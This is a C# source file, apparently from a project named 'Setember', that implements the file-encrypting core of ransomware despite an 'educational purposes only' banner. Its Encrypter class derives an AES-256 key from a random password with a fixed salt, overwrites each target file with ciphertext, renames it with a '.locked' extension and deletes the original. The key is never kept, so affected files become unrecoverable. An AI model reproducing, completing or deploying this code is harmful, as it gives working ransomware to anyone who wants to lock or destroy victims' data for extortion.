// 
//   ____ __________ _____ __  __ ____ _____ ____  
//  / ___|___ /_   _|___ /|  \/  | __ )___ /|  _ \ 
//  \___ \ |_ \ | |   |_ \| |\/| |  _ \ |_ \| |_) |
//   ___) |__) || |  ___) | |  | | |_) |__) |  _ < 
//  |____/____/ |_| |____/|_|  |_|____/____/|_| \_\
//                                                 
//
// Copyright (c) 2023 Daniel Aspect
// 
// This file is part of the "Setember" project, licensed under The MIT License.
// 
// THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Setember;

public class Encrypter : IDisposable
{
    private byte[] Key { get; set; }
    private byte[] IV { get; set; }
    private string Password { get; set; }
    private byte[] PasswordBytes { get; set; }

    private static readonly byte[] Salt = new byte[]
    {
        10, 20, 30, 40, 50, 60, 70, 80
    };

    private bool disposedValue;

    public Encrypter()
    {
        Password = CreatePassword(32);
        PasswordBytes = GetPasswordBytes(Password);
        var keys = GenAESKey(PasswordBytes);
        Key = keys[0];
        IV = keys[1];
    }

    public async Task<byte[]> EncryptWithAES(byte[] byteToEncrypt)
    {
        byte[] encryptedBytes = null;
        using (var memoryStream = new MemoryStream())
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;

                aes.Key = Key;
                aes.IV = IV;

                aes.Mode = CipherMode.CBC;

                using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    await cryptoStream.WriteAsync(byteToEncrypt, 0, byteToEncrypt.Length);
                    cryptoStream.Close();
                }
                encryptedBytes = memoryStream.ToArray();
            }
        }
        return encryptedBytes;
    }

    public async Task EncryptFileAsync(string filePath)
    {
        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);

        await Task.Run(async () =>
        {
            byte[] encryptedBytes = await EncryptWithAES(bytesToEncrypt);
            await File.WriteAllBytesAsync(filePath, encryptedBytes);
            try
            {
                File.Move(filePath, filePath + ".locked");
            }
            catch (Exception ex) { }
            finally
            {
                File.Delete(filePath);
            }
        });
    }

    #region Password and Key generation
    protected List<byte[]> GenAESKey(byte[] passwordBytes, int KeySizeInBytes = 32, int BlockSizeInBytes = 16)
    {
        var keys = new List<byte[]>();

        const ushort iterations = 5000;
        var keyGenerator = new Rfc2898DeriveBytes(passwordBytes, Salt, iterations);

        // keys[0] = AES.Key
        keys.Add(keyGenerator.GetBytes(KeySizeInBytes));
        // Kkeys[1] = AES.IV
        keys.Add(keyGenerator.GetBytes(BlockSizeInBytes));

        return keys;
    }

    protected byte[] GetPasswordBytes(string password)
        => SHA512.Create().ComputeHash(Encoding.UTF8.GetBytes(password));

    protected string CreatePassword(int passwordLength)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*=/";
        var random = new Random();
        var password = new StringBuilder();
        while (0 < passwordLength--)
        {
            password.Append(chars[random.Next(chars.Length - 1)]);
        }
        return password.ToString();
    }
    #endregion

    #region Disposing resources
    protected virtual void Dispose(bool disposing)
    {
        if (!disposedValue)
        {
            if (disposing)
            {
                // TODO: dispose managed state (managed objects)
            }

            // TODO: free unmanaged resources (unmanaged objects) and override finalizer
            // TODO: set large fields to null
            disposedValue = true;
        }
    }

    // // TODO: override finalizer only if 'Dispose(bool disposing)' has code to free unmanaged resources
    // ~Encrypter()
    // {
    //     // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
    //     Dispose(disposing: false);
    // }

    public void Dispose()
    {
        // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
        Dispose(disposing: true);
        GC.SuppressFinalize(this);
    }
    #endregion
}